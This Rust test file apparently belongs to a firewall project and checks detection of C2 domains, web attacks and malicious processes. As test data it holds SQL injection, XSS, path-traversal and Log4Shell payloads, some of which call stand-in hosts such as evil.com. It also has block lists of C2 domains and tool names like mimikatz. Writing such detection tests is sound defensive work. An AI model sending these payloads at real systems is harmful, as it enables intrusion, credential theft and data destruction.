//! Phase 1 Integration Tests — Thor Firewall Smart v0.4.0
//!
//! Tests the three new micro-agents working together:
//!   - thor-agent-net: DNS C2 detection + rate limiting
//!   - thor-agent-web: WAF OWASP detection + scoring
//!   - thor-agent-srv: FIM + process scanning
//!
//! Run with: `cargo test -p thor-agent --test phase1_agent_integration`

// ─── Agent-Net Integration Tests ─────────────────────────────────────────────

#[cfg(test)]
mod net_agent_tests {
    /// Test that DNS C2 detection correctly identifies known malicious domains.
    #[test]
    fn test_c2_domain_blocklist_exact() {
        // Simulate state with known C2 entry
        let c2_domains: std::collections::HashMap<String, bool> = [
            ("malware-c2.net".to_string(), true),
            ("cobaltstrike-beacon.xyz".to_string(), true),
        ].into();

        let domain = "malware-c2.net";
        assert!(
            c2_domains.contains_key(domain),
            "Direct C2 domain should be in blocklist"
        );
    }

    #[test]
    fn test_dga_entropy_calculation() {
        // Low entropy (legitimate domain)
        let google = "google.com";
        let google_entropy = shannon_entropy(google);
        assert!(google_entropy < 3.5, "google.com should have low entropy: {}", google_entropy);

        // High entropy (DGA-generated domain)
        let dga = "xj9kqmvp7wzabcdef.xyz";
        let dga_entropy = shannon_entropy(dga);
        assert!(dga_entropy > 3.0, "DGA domain should have higher entropy: {}", dga_entropy);
    }

    fn shannon_entropy(s: &str) -> f64 {
        if s.is_empty() { return 0.0; }
        let mut freq = [0u32; 256];
        for b in s.bytes() { freq[b as usize] += 1; }
        let len = s.len() as f64;
        freq.iter()
            .filter(|&&c| c > 0)
            .map(|&c| { let p = c as f64 / len; -p * p.log2() })
            .sum()
    }

    #[test]
    fn test_ip_parsing() {
        use std::net::Ipv4Addr;
        let valid_ips = ["192.168.1.1", "10.0.0.1", "185.220.101.5", "0.0.0.0"];
        let invalid_ips = ["256.1.2.3", "abc.def.ghi.jkl", "::1", ""];

        for ip in &valid_ips {
            assert!(ip.parse::<Ipv4Addr>().is_ok(), "Should parse: {}", ip);
        }
        for ip in &invalid_ips {
            assert!(ip.parse::<Ipv4Addr>().is_err(), "Should fail: {}", ip);
        }
    }

    #[test]
    fn test_rate_limit_window_reset() {
        // After 1 window, counter should reset
        let window_ms: u64 = 1000;
        let now: u64 = 1_000_000;
        let window_start: u64 = now - window_ms - 1;

        // expired window: now - window_start > window_ms
        assert!(
            now - window_start > window_ms,
            "Window should be expired"
        );
    }
}

// ─── Agent-Web Integration Tests ─────────────────────────────────────────────

#[cfg(test)]
mod web_agent_tests {
    #[test]
    fn test_owasp_sqli_patterns() {
        let sqli_payloads = vec![
            "1' OR 1=1--",
            "' UNION SELECT * FROM users--",
            "admin' --",
            "1; DROP TABLE users",
            "1' AND SLEEP(5)--",
            "pg_sleep(5)",
        ];

        for payload in sqli_payloads {
            let lower = payload.to_lowercase();
            let detected = lower.contains("or 1=1")
                || lower.contains("union select")
                || lower.contains("drop table")
                || lower.contains("sleep(")
                || lower.contains("pg_sleep");
            assert!(detected, "Should detect SQLi in: {}", payload);
        }
    }

    #[test]
    fn test_log4shell_detection() {
        let log4shell_payloads = vec![
            "${jndi:ldap://evil.com/exploit}",
            "${jndi:rmi://attacker.host/obj}",
            "${${::-j}${::-n}${::-d}${::-i}:ldap://}",
        ];

        for payload in log4shell_payloads {
            let lower = payload.to_lowercase();
            let detected = lower.contains("${jndi:") || lower.contains("jndi:ldap://");
            assert!(detected, "Should detect Log4Shell in: {}", payload);
        }
    }

    #[test]
    fn test_xss_patterns() {
        let xss_payloads = vec![
            "<script>alert(document.cookie)</script>",
            "javascript:eval('alert(1)')",
            "<img src=x onerror=alert(1)>",
        ];

        for payload in xss_payloads {
            let lower = payload.to_lowercase();
            let detected = lower.contains("<script>")
                || lower.contains("javascript:")
                || lower.contains("onerror=")
                || lower.contains("alert(")
                || lower.contains("eval(");
            assert!(detected, "Should detect XSS in: {}", payload);
        }
    }

    #[test]
    fn test_path_traversal_patterns() {
        let traversal_payloads = vec![
            "../../etc/passwd",
            "..%2f..%2fetc%2fshadow",
            "/etc/passwd",
            "....//....//etc/hosts",
        ];

        for payload in traversal_payloads {
            let lower = payload.to_lowercase();
            let detected = lower.contains("../")
                || lower.contains("..%2f")
                || lower.contains("/etc/passwd")
                || lower.contains("/etc/shadow")
                || lower.contains("/etc/hosts");
            assert!(detected, "Should detect path traversal in: {}", payload);
        }
    }

    #[test]
    fn test_clean_request_no_false_positives() {
        let clean_requests = vec![
            "/api/v1/users/profile?format=json",
            "/api/v1/products?category=electronics&sort=price",
            "/health",
            "/static/logo.png",
        ];

        let false_positive_triggers = [
            "union select", "or 1=1", "<script>", "javascript:",
            "${jndi:", "../etc", "/etc/passwd",
        ];

        for req in clean_requests {
            let lower = req.to_lowercase();
            for trigger in &false_positive_triggers {
                assert!(
                    !lower.contains(trigger),
                    "Clean request '{}' should not contain '{}'", req, trigger
                );
            }
        }
    }

    #[test]
    fn test_scanner_ua_detection() {
        let scanner_uas = vec!["sqlmap/1.7", "Nikto/2.1.6", "masscan/1.3", "Nmap Scripting Engine"];
        let legit_uas = vec!["Mozilla/5.0", "curl/7.88.1", "PostmanRuntime/7.32.0"];

        for ua in scanner_uas {
            let lower = ua.to_lowercase();
            let is_scanner = lower.contains("sqlmap") || lower.contains("nikto")
                || lower.contains("masscan") || lower.contains("nmap");
            assert!(is_scanner, "Should detect scanner UA: {}", ua);
        }

        for ua in legit_uas {
            let lower = ua.to_lowercase();
            let is_scanner = lower.contains("sqlmap") || lower.contains("nikto")
                || lower.contains("masscan") || lower.contains("nmap");
            assert!(!is_scanner, "Should not flag legit UA: {}", ua);
        }
    }
}

// ─── Agent-Srv Integration Tests ─────────────────────────────────────────────

#[cfg(test)]
mod srv_agent_tests {
    #[test]
    fn test_known_bad_process_names() {
        let known_bad = vec!["xmrig", "mimikatz", "svshost", "cobaltstrike"];

        for name in known_bad {
            assert!(!name.is_empty(), "Bad process name should not be empty: {}", name);
        }
    }

    #[test]
    fn test_file_hash_consistency() {
        use std::io::Read;

        // Read the same file twice and ensure hash is consistent
        fn fnv_hash(data: &[u8]) -> u64 {
            let mut h: u64 = 0xcbf29ce484222325;
            for &b in data {
                h ^= b as u64;
                h = h.wrapping_mul(0x100000001b3);
            }
            h
        }

        if let Ok(mut f) = std::fs::File::open("/etc/hostname") {
            let mut buf = Vec::new();
            if f.read_to_end(&mut buf).is_ok() {
                let h1 = fnv_hash(&buf);
                let h2 = fnv_hash(&buf);
                assert_eq!(h1, h2, "FNV hash should be deterministic");
            }
        }
    }

    #[test]
    fn test_severity_hierarchy() {
        let severity_order = ["UNKNOWN", "LOW", "MEDIUM", "HIGH", "CRITICAL"];
        for (i, sev) in severity_order.iter().enumerate() {
            assert!(!sev.is_empty());
            if i > 0 {
                // Each severity should be "higher" than the previous
                assert_ne!(sev, &severity_order[i-1]);
            }
        }
    }

    #[test]
    fn test_fim_path_coverage() {
        let critical_paths = vec![
            "/etc/passwd",
            "/etc/shadow",
            "/etc/sudoers",
            "/etc/ssh/sshd_config",
        ];

        for path in critical_paths {
            // These should all be monitored
            assert!(!path.is_empty());
            assert!(path.starts_with('/'));
        }
    }

    #[test]
    fn test_mitre_technique_format() {
        let techniques = vec![
            "T1496 Resource Hijacking",
            "T1059 Command and Scripting Interpreter",
            "T1003 OS Credential Dumping",
            "T1036.004 Masquerading: Match Legitimate Name",
        ];

        for t in techniques {
            assert!(t.starts_with('T'), "MITRE technique should start with T: {}", t);
            assert!(t.len() > 5, "MITRE technique should have description: {}", t);
        }
    }
}

// ─── Cross-Agent Integration Tests ───────────────────────────────────────────

#[cfg(test)]
mod cross_agent_tests {
    #[test]
    fn test_event_id_uniqueness() {
        use std::collections::HashSet;
        let ids: Vec<String> = (0..100)
            .map(|_| uuid::Uuid::new_v4().to_string())
            .collect();
        let unique: HashSet<&String> = ids.iter().collect();
        assert_eq!(ids.len(), unique.len(), "All event IDs should be unique");
    }

    #[test]
    fn test_threat_level_ordering() {
        // Verify threat levels are ordered correctly
        let levels = vec![(0, "UNKNOWN"), (1, "LOW"), (2, "MEDIUM"), (3, "HIGH"), (4, "CRITICAL")];
        for (i, (severity, name)) in levels.iter().enumerate() {
            assert_eq!(i, *severity as usize, "Level {} should have numeric value {}", name, i);
        }
    }

    #[test]
    fn test_unix_timestamp_reasonable() {
        use std::time::{SystemTime, UNIX_EPOCH};
        let ts = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();

        // Should be between 2024 and 2030
        assert!(ts > 1_700_000_000, "Timestamp should be after 2023");
        assert!(ts < 1_900_000_000, "Timestamp should be before 2030");
    }
}
